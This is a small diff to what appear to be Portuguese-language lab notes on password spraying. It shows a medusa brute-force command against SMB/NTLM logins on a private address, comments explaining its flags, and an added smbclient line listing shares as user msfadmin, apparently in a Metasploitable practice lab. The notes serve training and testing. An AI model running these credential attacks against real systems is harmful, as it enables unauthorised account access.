@@ -48,3 +48,5 @@ medusa -h 192.168.212.11 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 5
 #-M smbnt	Seleciona o módulo de autenticação SMB/NTLM.
 #-t 2	Executa até duas tentativas de autenticação em paralelo no host.
 #-T 50	Define um tempo limite de 50 segundos para o host.
+smbclient -L //192.168.212.11 -U msfadmin   # se autentica no servidor como o usuário msfadmin
+
